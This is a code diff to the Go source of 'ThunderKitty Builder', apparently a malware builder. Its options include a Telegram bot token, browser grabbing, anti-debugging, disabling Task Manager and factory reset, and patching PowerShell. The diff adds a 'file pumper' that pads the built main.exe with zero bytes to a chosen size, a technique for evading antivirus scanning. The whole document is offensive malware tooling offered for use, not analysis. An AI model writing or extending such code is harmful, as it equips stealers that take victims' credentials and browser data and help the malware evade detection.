@@ -5,6 +5,7 @@ import (
 	"os"
 	"os/exec"
 	"runtime"
+	"strconv"
 
 	"fyne.io/fyne/v2"
 
@@ -130,6 +131,28 @@ func main() {
 	fmt.Println("Build successful")
 }
 
+func pumpExecutable(path string, size int) {
+	file, err := os.ReadFile(path)
+	if err != nil {
+		panic(err)
+	}
+
+	size = size * 1024 * 1024 // Convert to MB
+
+	pumpAmount := size - len(file)
+	if pumpAmount <= 0 {
+		return
+	}
+
+	zeroBytes := make([]byte, pumpAmount)
+	err = os.WriteFile(path, append(file, zeroBytes...), 0600)
+	if err != nil {
+		return
+	}
+
+	return
+}
+
 func main() {
 	a := app.New()
 	w := a.NewWindow("ThunderKitty Builder")
@@ -153,18 +176,37 @@ func main() {
 	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
 	openSiteEntry.SetPlaceHolder("Open Website (leave blank for none)")
-
 	speakTTSEntry := widget.NewEntry()
 	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
-
 	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
 
+	// File Pumper Widgets
+	filePumperEntry := widget.NewEntry()
+	filePumperEntry.SetPlaceHolder("Pump File (size in MB)")
+
+	// Build button
 	buildButton := widget.NewButton("Build", func() {
+
+		// Delete old file
+		os.Remove("main.exe")
+
+		// Build the new one
 		telebottoken := telegramBotTokenEntry.Text
 		telechatid := telegramChatIdEntry.Text
 		openSiteURL := openSiteEntry.Text
 		speakTTSMessage := speakTTSEntry.Text
+		filePumperSize := filePumperEntry.Text
 		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked)
+
+		// Pumper
+		if filePumperSize != "" {
+			pumpSize, err := strconv.Atoi(filePumperSize)
+			if err != nil {
+				panic(err)
+			}
+			
+			pumpExecutable("main.exe", pumpSize)
+		}
 	})
 
 	grabberSettings := container.NewVBox(
@@ -188,12 +230,18 @@ func main() {
 		enableSwapMouse,
 	)
 
+	filePumperSettings := container.NewVBox(
+		widget.NewLabel("File Pumper Configuration"),
+		filePumperEntry,
+	)
+
 	tabs := container.NewAppTabs(
 		container.NewTabItem("Grabber Configuration", grabberSettings),
 		container.NewTabItem("Trollware Configuration", trollwareSettings),
+		container.NewTabItem("File Pumper", filePumperSettings),
 	)
 
 	w.SetContent(tabs)
-	w.Resize(fyne.NewSize(400, 350))
+	w.Resize(fyne.NewSize(500, 350))
 	w.ShowAndRun()
 }
